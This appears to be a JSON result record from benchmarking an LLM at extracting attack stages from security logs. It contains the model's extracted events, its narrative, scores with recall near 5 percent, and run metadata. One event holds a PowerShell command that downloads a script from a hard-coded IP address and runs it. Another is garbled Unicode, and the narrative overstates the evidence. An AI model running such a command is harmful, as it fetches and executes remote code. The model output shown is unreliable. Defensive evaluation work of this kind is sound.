@@ -1,0 +1,68 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2605\u3046\u3081\u306f\ud835\udc0e\uc988\ub97c\uc774\ud398\uc758\ubbfc\uac74\ub294 \ud558\uc138\uc694 \uc18c\uace0\uac15.",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "An adversary has successfully gained access to the system through an initial command via PowerShell executing a bypass policy with encoded commands. The system accessed the remote server to download additional payloads for further exploitation, establishing Command and Control channels.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 18407,
+      "completion_tokens": 275,
+      "total_tokens": 18682,
+      "wall_clock_s": 28.023,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.5,
+      "recall": 0.05263157894736842,
+      "f1": 0.09523809523809525,
+      "tp": 2,
+      "fp": 2,
+      "fn": 36
+    },
+    "stage": {
+      "precision": 0.5,
+      "recall": 0.05263157894736842,
+      "f1": 0.09523809523809525,
+      "tp": 2,
+      "fp": 2,
+      "fn": 36,
+      "recall_partial": 0.02702702702702703
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 18407,
+      "completion_tokens": 275,
+      "total_tokens": 18682,
+      "wall_clock_s": 28.023,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
